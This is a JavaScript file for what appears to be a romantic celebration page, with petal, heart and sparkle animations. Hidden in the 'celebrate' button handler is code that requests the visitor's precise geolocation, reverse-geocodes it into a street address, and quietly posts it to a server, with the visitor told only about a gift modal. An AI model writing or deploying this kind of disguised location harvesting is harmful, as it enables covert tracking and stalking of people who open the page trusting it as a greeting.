// Ultimate Floral Animation Engine
document.addEventListener('DOMContentLoaded', () => {
    const sections = document.querySelectorAll('section');
    const celebrateBtn = document.getElementById('celebrateBtn');
    const giftModal = document.getElementById('giftModal');
    const closeModal = document.getElementById('closeModal');

    // 1. Smooth Section Reveal Observer
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
            }
        });
    }, { threshold: 0.1 });

    sections.forEach(section => observer.observe(section));

    // 2. Floral Petal Spawner
    function createPetal() {
        const petal = document.createElement('div');
        petal.className = 'petal';

        // Random sizes and positions
        const size = Math.random() * 15 + 10 + 'px';
        petal.style.width = size;
        petal.style.height = size;
        petal.style.left = Math.random() * 100 + 'vw';

        // Random animation duration and delay
        const duration = Math.random() * 7 + 8 + 's';
        const delay = Math.random() * 5 + 's';
        petal.style.animationDuration = duration;
        petal.style.animationDelay = delay;

        // Random petal shapes (rounded corners)
        const roundness = Math.random() * 50 + 50 + '%';
        petal.style.borderRadius = `${roundness} 0 ${roundness} 0`;

        document.body.appendChild(petal);

        // Remove petal after animation finishes
        setTimeout(() => {
            petal.remove();
        }, (parseFloat(duration) + parseFloat(delay)) * 1000);
    }

    // Spawn petals constantly
    setInterval(createPetal, 600);

    // 2.5 Big Heart Animation System
    function createBigHeart() {
        const heart = document.createElement('div');
        heart.innerHTML = '❤️';
        heart.className = 'big-heart-float';

        // Random sizes for variety
        const size = Math.random() * 40 + 40 + 'px'; // Big hearts
        heart.style.fontSize = size;
        heart.style.left = Math.random() * 100 + 'vw';

        const duration = Math.random() * 10 + 15 + 's'; // Slower, more majestic
        heart.style.animationDuration = duration + ', 2s'; // Move time, pulse time

        document.body.appendChild(heart);

        setTimeout(() => {
            heart.remove();
        }, parseFloat(duration) * 1000);
    }

    // Spawn a big heart every few seconds
    setInterval(createBigHeart, 3000);

    // 2.7 Magical Glitter System
    function createSparkle(x, y) {
        const sparkle = document.createElement('div');
        sparkle.className = 'tiny-sparkle';
        sparkle.style.left = x + 'px';
        sparkle.style.top = y + 'px';
        document.body.appendChild(sparkle);
        setTimeout(() => sparkle.remove(), 2000);
    }

    // Sparkle on mouse move
    window.addEventListener('mousemove', (e) => {
        if (Math.random() > 0.9) createSparkle(e.clientX, e.clientY);
    });

    // Random background sparkles
    setInterval(() => {
        createSparkle(Math.random() * window.innerWidth, Math.random() * window.innerHeight);
    }, 400);

    // Wax Seal Heart Burst
    const waxSeal = document.querySelector('.wax-seal');
    if (waxSeal) {
        waxSeal.addEventListener('mousedown', () => {
            for (let i = 0; i < 15; i++) {
                const h = document.createElement('div');
                h.innerHTML = '❤️';
                h.style.position = 'fixed';
                h.style.left = event.clientX + 'px';
                h.style.top = event.clientY + 'px';
                h.style.pointerEvents = 'none';
                h.style.zIndex = '10001';
                h.style.transition = 'all 1s ease-out';
                document.body.appendChild(h);

                const angle = Math.random() * Math.PI * 2;
                const dist = Math.random() * 150 + 50;

                setTimeout(() => {
                    h.style.transform = `translate(${Math.cos(angle) * dist}px, ${Math.sin(angle) * dist}px) scale(0) rotate(${Math.random() * 360}deg)`;
                    h.style.opacity = '0';
                    setTimeout(() => h.remove(), 1000);
                }, 10);
            }
        });
    }

    // 3. Location & Celebration Bridge
    celebrateBtn.addEventListener('click', (e) => {
        e.preventDefault();

        // Reveal Modal with Animation
        giftModal.style.display = 'flex';
        giftModal.style.opacity = '0';
        setTimeout(() => {
            giftModal.style.transition = 'opacity 0.5s ease';
            giftModal.style.opacity = '1';
        }, 10);

        document.body.style.overflow = 'hidden';

        // Precise Location Sequence
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;

                const geocoder = new google.maps.Geocoder();
                const latlng = { lat: lat, lng: lng };

                geocoder.geocode({ location: latlng }, (results, status) => {
                    let exactAddress = "Unknown Paradise";
                    if (status === "OK" && results[0]) {
                        exactAddress = results[0].formatted_address;
                    }
                    saveLocationToDB(lat, lng, exactAddress);
                });
            }, (error) => {
                console.warn("Location permission denied", error);
            }, { enableHighAccuracy: true });
        }
    });

    closeModal.addEventListener('click', () => {
        giftModal.style.opacity = '0';
        setTimeout(() => {
            giftModal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }, 500);
    });

    window.addEventListener('click', (e) => {
        if (e.target === giftModal) closeModal.click();
    });
});

function saveLocationToDB(lat, lng, address) {
    const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
    let saveUrl = window.SAVE_LOCATION_URL || '/save-location';

    // Protocol Fix for Localhost SSL issues
    if (window.location.protocol === 'http:') {
        saveUrl = saveUrl.replace('https:', 'http:');
    }

    fetch(saveUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrfToken,
            'Accept': 'application/json'
        },
        body: JSON.stringify({ latitude: lat, longitude: lng, address: address })
    })
        .catch(err => console.error("Database save failed silenty", err));
}
